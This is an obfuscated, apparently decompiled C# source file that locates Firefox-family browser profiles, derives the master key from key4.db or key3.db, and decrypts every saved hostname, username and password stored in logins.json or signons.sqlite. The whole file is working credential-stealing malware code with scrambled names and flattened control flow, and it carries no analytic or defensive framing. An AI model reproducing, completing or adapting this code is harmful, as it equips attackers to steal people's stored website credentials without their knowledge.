using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using C6Zy;
using JSW1fecBOy;
using rCOGWW;
using reJu9lk2r;

namespace Cc5oGNTD
{
	public class COF
	{
		private static byte[] Om2X(byte[] qFm9, byte[] h4ZhY, byte[] o4Uf0KSjDf8, byte[] It5y)
		{
			byte[] result;
			try
			{
				byte[] pgB3CAqlF = eha4ad2F.0aCzg(g3Vt7T2gk5.6RprJ(qFm9, h4ZhY));
				byte[] yd2DMRjPKVL = eha4ad2F.0aCzg(g3Vt7T2gk5.6RprJ(pgB3CAqlF, o4Uf0KSjDf8));
				byte[] array = new byte[20];
				Array.Copy(o4Uf0KSjDf8, 0, array, 0, o4Uf0KSjDf8.Length);
				for (int i = o4Uf0KSjDf8.Length; i <= 19; i++)
				{
					array[i] = 0;
				}
				byte[] pgB3CAqlF2 = eha4ad2F.3RB(yd2DMRjPKVL, g3Vt7T2gk5.6RprJ(array, o4Uf0KSjDf8));
				byte[] pgB3CAqlF3 = eha4ad2F.3RB(yd2DMRjPKVL, array);
				byte[] ku2hGQG0kd = eha4ad2F.3RB(yd2DMRjPKVL, g3Vt7T2gk5.6RprJ(pgB3CAqlF3, o4Uf0KSjDf8));
				byte[] sourceArray = g3Vt7T2gk5.6RprJ(pgB3CAqlF2, ku2hGQG0kd);
				byte[] array2 = new byte[8];
				byte[] array3 = new byte[24];
				Array.Copy(sourceArray, 0, array3, 0, 24);
				Array.Copy(sourceArray, 32, array2, 0, 8);
				result = qS6WnrZN4l.BE6M1GJVa(It5y, array3, array2);
			}
			catch
			{
				result = null;
			}
			return result;
		}

		private static byte[] mD0(byte[] VCH, byte[] Gho8bUy, byte[] t8V8TUDUS, byte[] or3eQ, byte[] sywdi3)
		{
			byte[] result;
			try
			{
				byte[] password = eha4ad2F.0aCzg(g3Vt7T2gk5.6RprJ(VCH, Gho8bUy));
				byte[] rkZXn83T = new byte[32];
				using (HMACSHA256 hmacsha = new HMACSHA256())
				{
					rkZXn83T = new 93WgTZS3(hmacsha, password, t8V8TUDUS, 1).sVd(32);
				}
				byte[] array = new byte[16];
				array[0] = 4;
				array[1] = 14;
				Array.Copy(sywdi3, 0, array, 2, 14);
				rliYkpvg rliYkpvg = new rliYkpvg();
				result = rliYkpvg.w2fMtP(or3eQ, rkZXn83T, array);
			}
			catch
			{
				result = null;
			}
			return result;
		}

		public static byte[] 1N7un(string llLKgYvj)
		{
			int num = 0;
			byte[] array;
			for (;;)
			{
				if (num == 2)
				{
					if (!File.Exists(llLKgYvj + "key4.db"))
					{
						goto IL_491;
					}
					num = 3;
				}
				if (num == 4)
				{
					break;
				}
				if (num == 1)
				{
					array = new byte[24];
					num = 2;
				}
				if (num == 3)
				{
					goto Block_4;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 5)
				{
					byte[] result;
					return result;
				}
			}
			IL_56:
			return null;
			Block_4:
			try
			{
				btrVogW btrVogW = new btrVogW(llLKgYvj + "key4.db");
				if (!btrVogW.f9NLCu("metaData"))
				{
					return null;
				}
				if (!(btrVogW.jK2IxJ35o1(0, "id") == "password"))
				{
					return null;
				}
				byte[] bytes = Encoding.Default.GetBytes(btrVogW.jK2IxJ35o1(0, "item1"));
				byte[] bytes2 = Encoding.Default.GetBytes(btrVogW.jK2IxJ35o1(0, "item2"));
				1ojM8OAmgFO 1ojM8OAmgFO = new 1ojM8OAmgFO();
				q3iR8 q3iR = 1ojM8OAmgFO.Xuk(bytes2);
				string text = g3Vt7T2gk5.eCqZ9sy(q3iR.35ejV[0].35ejV[0].35ejV[0].UfibxSIi).ToLower();
				btrVogW btrVogW2 = new btrVogW(llLKgYvj + "key4.db");
				if (!btrVogW2.f9NLCu("nssPrivate"))
				{
					return null;
				}
				byte[] bytes3 = Encoding.Default.GetBytes(btrVogW2.jK2IxJ35o1(0, "a11"));
				Encoding.Default.GetBytes(btrVogW2.jK2IxJ35o1(0, "a102"));
				q3iR8 q3iR2 = 1ojM8OAmgFO.Xuk(bytes3);
				if (text.Contains("2a864886f70d0209") | text.Contains("2a864886f70d010c050103"))
				{
					byte[] data = q3iR2.35ejV[0].35ejV[0].35ejV[1].35ejV[0].UfibxSIi;
					byte[] data2 = q3iR2.35ejV[0].35ejV[1].UfibxSIi;
					byte[] sourceArray = COF.Om2X(bytes, Encoding.ASCII.GetBytes(""), data, data2);
					Array.Copy(sourceArray, array, 24);
					return array;
				}
				byte[] data3 = q3iR2.35ejV[0].35ejV[0].35ejV[1].35ejV[0].35ejV[1].35ejV[0].UfibxSIi;
				byte[] data4 = q3iR2.35ejV[0].35ejV[1].UfibxSIi;
				byte[] data5 = q3iR2.35ejV[0].35ejV[0].35ejV[1].35ejV[2].35ejV[1].UfibxSIi;
				byte[] array2 = COF.mD0(bytes, Encoding.ASCII.GetBytes(""), data3, data4, data5);
				if (array2 == null)
				{
					return null;
				}
				Array.Copy(array2, array, 24);
				return array;
			}
			catch
			{
				return null;
			}
			IL_491:
			if (File.Exists(llLKgYvj + "key3.db"))
			{
				try
				{
					string text2 = "";
					byte[] qFm = new byte[0];
					aiGQ8zQfr aiGQ8zQfr = new aiGQ8zQfr(llLKgYvj + "key3.db");
					foreach (KeyValuePair<string, string> keyValuePair in aiGQ8zQfr.rVBLiIz8abw)
					{
						if (keyValuePair.Key != "global-salt" & keyValuePair.Key != "Version" & keyValuePair.Key != "password-check")
						{
							text2 = keyValuePair.Value;
						}
						if (keyValuePair.Key == "global-salt")
						{
							qFm = g3Vt7T2gk5.83xr(keyValuePair.Value.Replace("-", ""));
						}
					}
					1ojM8OAmgFO 1ojM8OAmgFO2 = new 1ojM8OAmgFO();
					q3iR8 q3iR3 = 1ojM8OAmgFO2.Xuk(g3Vt7T2gk5.83xr(text2.Replace("-", "")));
					byte[] data6 = q3iR3.35ejV[0].35ejV[0].35ejV[1].35ejV[0].UfibxSIi;
					byte[] fH0X = COF.Om2X(qFm, Encoding.ASCII.GetBytes(""), data6, q3iR3.35ejV[0].35ejV[1].UfibxSIi);
					q3iR8 q3iR4 = 1ojM8OAmgFO2.Xuk(fH0X);
					q3iR8 q3iR5 = 1ojM8OAmgFO2.Xuk(q3iR4.35ejV[0].35ejV[2].UfibxSIi);
					if (q3iR5.35ejV[0].35ejV[3].UfibxSIi.Length > 24)
					{
						Array.Copy(q3iR5.35ejV[0].35ejV[3].UfibxSIi, q3iR5.35ejV[0].35ejV[3].UfibxSIi.Length - 24, array, 0, 24);
					}
					else
					{
						Array.Copy(q3iR5.35ejV[0].35ejV[0].UfibxSIi, array, 24);
					}
					return array;
				}
				catch
				{
					goto IL_56;
				}
			}
			return null;
		}

		// Token: 0x06000161 RID: 353 RVA: 0x0001D960 File Offset: 0x0001BB60
		public static string[] wS9grBYZnl(string TPnhV)
		{
			int num = 0;
			List<string> list;
			do
			{
				if (num == 1)
				{
					list = new List<string>();
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 2);
			try
			{
				foreach (object obj in new Regex("Path=([A-z0-9\\/\\.\\-]+)").Matches(File.ReadAllText(TPnhV + "profiles.ini")))
				{
					Match match = (Match)obj;
					list.Add(TPnhV + match.Groups[1].Value + "\\");
				}
			}
			catch
			{
			}
			return list.ToArray();
		}

		// Token: 0x06000162 RID: 354 RVA: 0x0001DAB8 File Offset: 0x0001BCB8
		public static List<WTitxI2m> 0pdu(string[] jaqrsc, string XGfv3Cd)
		{
			int num = 0;
			List<WTitxI2m> list;
			for (;;)
			{
				if (num != 20)
				{
					goto IL_36;
				}
				string value;
				if (!string.IsNullOrEmpty(value))
				{
					num = 21;
					goto IL_36;
				}
				goto IL_300;
				IL_5F4:
				q3iR8 q3iR;
				byte[] array;
				if (num == 30)
				{
					Array.Copy(q3iR.35ejV[0].35ejV[2].UfibxSIi, array, 128);
					num = 31;
				}
				int num2;
				if (num == 3)
				{
					num2 = 0;
					num = 4;
				}
				Regex regex;
				if (num == 11)
				{
					regex = new Regex("\\\"(hostname|encryptedPassword|encryptedUsername)\":\"(.*?)\"");
					num = 12;
				}
				if (num == 32)
				{
					goto IL_6A4;
				}
				IL_6D8:
				if (num == 1)
				{
					list = new List<WTitxI2m>();
					num = 2;
				}
				MatchCollection matchCollection;
				int num3;
				string value2;
				if (num == 18)
				{
					value2 = matchCollection[num3 + 2].Groups[2].Value;
					num = 19;
				}
				if (num == 15)
				{
					goto IL_267;
				}
				if (num == 29)
				{
					if (q3iR.35ejV[0].35ejV[2].UfibxSIi.Length <= 128)
					{
						goto IL_6A4;
					}
					num = 30;
				}
				if (num == 31)
				{
					goto IL_328;
				}
				byte[] array2;
				if (num == 9)
				{
					if (array2 == null)
					{
						goto IL_BA;
					}
					num = 10;
				}
				string text;
				string input;
				if (num == 10)
				{
					input = File.ReadAllText(text + "logins.json");
					num = 11;
				}
				if (num == 7)
				{
					if (COF.1N7un(text) == null)
					{
						goto IL_BA;
					}
					num = 8;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 43)
				{
					break;
				}
				continue;
				IL_6A4:
				array = q3iR.35ejV[0].35ejV[2].UfibxSIi;
				num = 33;
				goto IL_6D8;
				IL_45E:
				string value3;
				if (num == 19)
				{
					if (string.IsNullOrEmpty(value3))
					{
						goto IL_300;
					}
					num = 20;
				}
				byte[] data;
				if (num == 27)
				{
					data = q3iR.35ejV[0].35ejV[1].35ejV[1].UfibxSIi;
					num = 28;
				}
				if (num == 2)
				{
					num = 3;
				}
				if (num == 28)
				{
					array = new byte[128];
					num = 29;
				}
				1ojM8OAmgFO 1ojM8OAmgFO;
				if (num == 26)
				{
					q3iR = 1ojM8OAmgFO.Xuk(Convert.FromBase64String(value2));
					num = 27;
				}
				q3iR8 q3iR2;
				byte[] data2;
				if (num == 23)
				{
					data2 = q3iR2.35ejV[0].35ejV[1].35ejV[1].UfibxSIi;
					num = 24;
				}
				if (num == 14)
				{
					num3 = 0;
					num = 15;
				}
				if (num == 42)
				{
					goto IL_5DC;
				}
				goto IL_5F4;
				IL_346:
				byte[] data3;
				if (num == 24)
				{
					data3 = q3iR2.35ejV[0].35ejV[2].UfibxSIi;
					num = 25;
				}
				if (num == 8)
				{
					array2 = COF.1N7un(text);
					num = 9;
				}
				if (num == 36)
				{
					goto IL_1BB;
				}
				if (num == 21)
				{
					if (value2 == null)
					{
						goto IL_300;
					}
					num = 22;
				}
				if (num == 12)
				{
					matchCollection = regex.Matches(input);
					num = 13;
				}
				if (num == 16)
				{
					goto IL_430;
				}
				goto IL_45E;
				IL_317:
				if (num == 33)
				{
					goto IL_328;
				}
				goto IL_346;
				IL_288:
				if (num == 22)
				{
					q3iR2 = 1ojM8OAmgFO.Xuk(Convert.FromBase64String(value));
					num = 23;
				}
				if (num == 6)
				{
					if (!File.Exists(text + "logins.json"))
					{
						goto IL_BA;
					}
					num = 7;
				}
				if (num == 39)
				{
					goto IL_300;
				}
				goto IL_317;
				IL_227:
				string input2;
				if (num == 25)
				{
					input2 = qS6WnrZN4l.ndFD4zyM(data3, array2, data2);
					num = 26;
				}
				if (num == 40)
				{
					goto IL_267;
				}
				goto IL_288;
				IL_1AA:
				if (num == 38)
				{
					goto IL_1BB;
				}
				goto IL_227;
				IL_D1:
				if (num == 17)
				{
					value = matchCollection[num3 + 1].Groups[2].Value;
					num = 18;
				}
				if (num != 34)
				{
					goto IL_148;
				}
				if (value3.StartsWith("oauth"))
				{
					num = 35;
					goto IL_148;
				}
				goto IL_159;
				IL_183:
				if (num == 5)
				{
					goto IL_194;
				}
				goto IL_1AA;
				IL_148:
				if (num != 37)
				{
					goto IL_183;
				}
				IL_159:
				string text2;
				string password = Regex.Replace(text2, "[^\\u0020-\\u007F]", "");
				num = 38;
				goto IL_183;
				IL_36:
				if (num != 4)
				{
					if (num == 13)
					{
						1ojM8OAmgFO = new 1ojM8OAmgFO();
						num = 14;
					}
					if (num == 35)
					{
						password = Convert.ToBase64String(Encoding.UTF8.GetBytes(text2));
						num = 36;
					}
					if (num == 41)
					{
						goto IL_BA;
					}
					goto IL_D1;
				}
				IL_5DC:
				if (num2 >= jaqrsc.Length)
				{
					num = 43;
					goto IL_5F4;
				}
				goto IL_194;
				IL_430:
				value3 = matchCollection[num3].Groups[2].Value;
				num = 17;
				goto IL_45E;
				IL_267:
				if (num3 > matchCollection.Count - 1)
				{
					num = 41;
					goto IL_288;
				}
				goto IL_430;
				IL_328:
				text2 = qS6WnrZN4l.ndFD4zyM(array, array2, data);
				num = 34;
				goto IL_346;
				IL_300:
				num3 += 3;
				num = 40;
				goto IL_317;
				IL_1BB:
				list.Add(new WTitxI2m
				{
					data1 = value3,
					data2 = Regex.Replace(input2, "[^\\u0020-\\u007F]", ""),
					data3 = password,
					data4 = XGfv3Cd
				});
				num = 39;
				goto IL_227;
				IL_194:
				text = jaqrsc[num2];
				num = 6;
				goto IL_1AA;
				IL_BA:
				num2++;
				num = 42;
				goto IL_D1;
			}
			return list;
		}

		// Token: 0x06000163 RID: 355 RVA: 0x0001E34C File Offset: 0x0001C54C
		public static List<WTitxI2m> BMRdyTI(string[] UV8nyZ, string FFEasj0)
		{
			int num = 0;
			List<WTitxI2m> list;
			for (;;)
			{
				if (num != 9)
				{
					goto IL_31;
				}
				byte[] array;
				if (array != null)
				{
					num = 10;
					goto IL_31;
				}
				goto IL_4D6;
				IL_58:
				if (num == 1)
				{
					list = new List<WTitxI2m>();
					num = 2;
				}
				int num2;
				if (num == 3)
				{
					num2 = 0;
					num = 4;
				}
				if (num == 4)
				{
					goto IL_4E4;
				}
				if (num == 2)
				{
					num = 3;
				}
				string text;
				if (num == 8)
				{
					array = COF.1N7un(text);
					num = 9;
				}
				string text2;
				if (num == 7)
				{
					if (!File.Exists(text2))
					{
						goto IL_4D6;
					}
					num = 8;
				}
				if (num == 6)
				{
					text2 = text + "signons.sqlite";
					num = 7;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num != 10)
				{
					continue;
				}
				btrVogW btrVogW;
				try
				{
					btrVogW = new btrVogW(text2);
				}
				catch
				{
					goto IL_4D6;
				}
				if (btrVogW.f9NLCu("moz_logins"))
				{
					1ojM8OAmgFO 1ojM8OAmgFO = new 1ojM8OAmgFO();
					for (int i = 0; i <= btrVogW.unm() - 1; i++)
					{
						try
						{
							string text3 = btrVogW.jK2IxJ35o1(i, "hostname");
							string text4 = btrVogW.jK2IxJ35o1(i, "encryptedUsername");
							string text5 = btrVogW.jK2IxJ35o1(i, "encryptedPassword");
							if (!string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4) && text5 != null)
							{
								q3iR8 q3iR = 1ojM8OAmgFO.Xuk(Convert.FromBase64String(text4));
								byte[] data = q3iR.35ejV[0].35ejV[1].35ejV[1].UfibxSIi;
								byte[] data2 = q3iR.35ejV[0].35ejV[2].UfibxSIi;
								string input = qS6WnrZN4l.ndFD4zyM(data2, array, data);
								q3iR8 q3iR2 = 1ojM8OAmgFO.Xuk(Convert.FromBase64String(text5));
								byte[] data3 = q3iR2.35ejV[0].35ejV[1].35ejV[1].UfibxSIi;
								byte[] array2 = new byte[128];
								if (q3iR2.35ejV[0].35ejV[2].UfibxSIi.Length > 128)
								{
									Array.Copy(q3iR2.35ejV[0].35ejV[2].UfibxSIi, array2, 128);
								}
								else
								{
									array2 = q3iR2.35ejV[0].35ejV[2].UfibxSIi;
								}
								string text6 = qS6WnrZN4l.ndFD4zyM(array2, array, data3);
								string password;
								if (text3.StartsWith("oauth"))
								{
									password = Convert.ToBase64String(Encoding.UTF8.GetBytes(text6));
								}
								else
								{
									password = Regex.Replace(text6, "[^\\u0020-\\u007F]", "");
								}
								list.Add(new WTitxI2m
								{
									data1 = text3,
									data2 = Regex.Replace(input, "[^\\u0020-\\u007F]", ""),
									data3 = password,
									data4 = FFEasj0
								});
							}
						}
						catch
						{
						}
					}
					goto IL_4D6;
				}
				goto IL_4D6;
				IL_31:
				if (num != 5)
				{
					goto IL_58;
				}
				IL_42:
				text = UV8nyZ[num2];
				num = 6;
				goto IL_58;
				IL_4E4:
				if (num2 >= UV8nyZ.Length)
				{
					break;
				}
				goto IL_42;
				IL_4D6:
				num2++;
				goto IL_4E4;
			}
			return list;
		}
	}
}
